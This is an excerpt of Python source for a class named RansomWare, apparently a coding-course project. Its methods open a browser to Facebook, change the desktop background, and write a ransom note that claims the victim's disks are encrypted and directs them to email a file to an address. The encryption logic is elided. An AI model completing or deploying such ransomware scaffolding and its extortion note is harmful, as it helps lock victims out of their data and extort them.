...
class RansomWare:
    ...
    @staticmethod
    def what_is_facebook():
        url = 'https://facebook.com'
        # Open browser to the https://facebook.com so they know what facebook is
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://unsplash.com/photos/88Yt8rpS6iU'
    ...
    def ransom_note(self):
        ...
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an Code fellows grade encryption.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To get your key back and restore your data you better follow these instructions:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to doe22@hotmail.com
